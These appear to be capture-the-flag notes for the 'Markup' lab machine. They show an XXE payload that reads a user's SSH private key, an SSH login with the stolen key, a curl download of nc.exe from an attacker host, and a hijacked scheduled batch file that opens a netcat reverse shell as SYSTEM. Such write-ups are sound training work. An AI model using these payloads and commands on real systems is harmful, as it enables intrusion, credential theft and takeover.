# Markup: Machine Notes

## Recon & Initial Access

### XXE Vulnerability
- Found a vulnerable XML processing endpoint at `http://markup.htb/process.php`.
- Payload to read the SSH private key for user `daniel`:
```xml
<?xml version="1.0"?>
<!DOCTYPE order [
<!ENTITY xxe SYSTEM "file:///c:/users/daniel/.ssh/id_rsa">
]>
<order>
<quantity>1</quantity>
<item>&xxe;</item>
<address>test</address>
</order>
```

### SSH Foothold
1. Save the extracted key to a file (e.g., `daniel_ssh_key`).
2. Set correct permissions: `chmod 600 daniel_ssh_key`.
3. Login:
```bash
ssh -i daniel_ssh_key daniel@markup.htb
```

## Privilege Escalation

### Scheduled Task / Job Hijacking
- Investigated `C:\Log-Management` and found a scheduled job mechanism (e.g., `job.bat`).
- Hijack the batch file to get a reverse shell as SYSTEM.

1. Host `nc.exe` on your Kali machine:
```bash
python3 -m http.server 8000
```
2. Download `nc.exe` on the target:
```powershell
curl http://10.10.14.252:8000/nc.exe -o C:\Log-Management\nc.exe
```
3. Overwrite the job file to execute a reverse shell:
```powershell
echo C:\Log-Management\nc.exe -e cmd.exe 10.10.16.7 4444 > C:\Log-Management\job.bat
```
4. Listen on Kali:
```bash
nc -lnvp 4444
```
- Wait for the task to trigger and receive a SYSTEM shell.
